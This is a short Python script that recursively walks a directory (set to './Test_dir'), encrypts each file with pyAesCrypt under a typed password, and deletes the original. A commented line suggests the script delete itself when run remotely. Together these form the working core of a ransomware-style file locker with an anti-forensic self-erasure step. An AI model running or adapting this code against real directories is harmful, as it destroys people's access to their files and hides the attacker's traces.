import pyAesCrypt  
import os
import sys

# file encryption function
def encryption(file, password):
    # Buffer size
    buffer_size = 512*1024
    
    # Ecryption method
    pyAesCrypt.encryptFile(
        str(file),
        str(file)+".crp",
        password,
        buffer_size
    )
    
    print("[File '" + str(os.path.splitext(file)[0]) + "' encrypted]")
    
    # Deleting source file
    os.remove(file)
    
# dir scanning function
def walking_by_dirs(dir, password):
    # subdir scanning
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        
        # if find file then encrypt it
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # If find directory repeate the cycle for searching files
        else:
            walking_by_dirs(path, password)
        
password = input("Enter your password: ")
walking_by_dirs("./Test_dir", password)
# If we work remotely it is better to delete our scripts:
#os.remove(str(sys.argv[0]))